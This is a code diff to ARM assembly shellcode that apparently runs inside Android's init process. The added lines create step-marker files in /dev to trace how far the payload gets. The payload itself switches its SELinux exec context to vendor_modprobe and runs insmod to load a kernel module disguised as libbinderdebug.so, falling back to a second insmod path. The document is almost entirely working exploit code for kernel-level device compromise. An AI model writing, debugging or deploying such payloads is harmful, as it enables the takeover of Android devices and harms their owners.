@@ -31,6 +31,11 @@ exe_path:
     .asciz "/vendor/bin/insmod"
 exe_path2:
     .asciz "/system/bin/insmod"
+step1:  .asciz "/dev/dfw1"
+step2:  .asciz "/dev/dfw2"
+step3:  .asciz "/dev/dfw3"
+step4:  .asciz "/dev/dfw4"
+step5:  .asciz "/dev/dfw5"
 ko_target:
     .ascii "/vendor/lib/libbinderdebug.so\0"
     .skip 34, 0                             // pad to 64 bytes — longest candidate path
@@ -40,6 +45,18 @@ libcxx_ko_target_off:
     .int ko_target - libcxx_data
 
     .balign 4
+
+    @ create a marker file so the parent can see how far the payload got.
+    @ clobbers r0-r3 and r7 only.
+    .macro mark lbl
+    mvn     r0, #~AT_FDCWD
+    adr     r1, \lbl
+    movw    r2, #(O_CREAT|O_WRONLY)         @ 0x0041
+    movt    r2, #(O_CLOEXEC >> 16)          @ 0x0008 -> 0x00080041
+    movs    r3, #0
+    movw    r7, #SYS_openat
+    svc     #0
+    .endm
 
 libcxx_start:
     push    {r0-r7, lr}                     // save everything we may clobber
@@ -91,6 +108,7 @@ libcxx_start:
     bne     return                          @ parent returns to init
 
     // ── worker child ──────────────────────────────────────────────────────
+    mark    step1
     sub     sp, sp, #16
 
     // Fork grandchild: set SELinux exec context → execve insmod
@@ -100,6 +118,7 @@ libcxx_start:
     bne     myexit
 
     // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
+    mark    step2
     // open /proc/self/attr/exec
     mvn     r0, #~AT_FDCWD
     adr     r1, attr_exec
@@ -112,6 +131,8 @@ libcxx_start:
     movs    r2, #(selinux_ctx_end - selinux_ctx)
     movs    r7, #SYS_write
     svc     #0
+
+    mark    step3
 
     // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
     add     r1, sp, #0
@@ -126,12 +147,17 @@ libcxx_start:
     movs    r7, #SYS_execve
     svc     #0
 
+    mark    step4          @ execve returned: /vendor/bin/insmod is NOT there
+
     // Fallback: 32-bit builds often ship toybox insmod instead of vendor insmod
     adr     r3, exe_path2
+    add     r1, sp, #0                      @ mark 宏踩过 r1，重新取 argv 数组
     str     r3, [r1, #0]
     adr     r0, exe_path2
     movs    r7, #SYS_execve
     svc     #0
+
+    mark    step5          @ both insmod paths returned: neither exists
 
 myexit:
     movs    r0, #1
